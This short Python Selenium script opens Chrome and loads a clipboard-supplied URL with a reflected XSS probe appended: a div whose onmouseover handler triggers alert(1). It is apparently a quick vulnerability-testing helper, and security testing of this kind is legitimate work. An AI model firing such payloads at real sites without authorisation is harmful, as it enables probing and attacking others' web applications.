from selenium import webdriver
import os
import pyperclip as pc
driver = webdriver.Chrome(executable_path="6.exe")
driver.maximize_window()
driver.get("{}<input type='text' value=`` <div/onmouseover='alert(1)'>Xss Found</div>".format(pc.paste()))
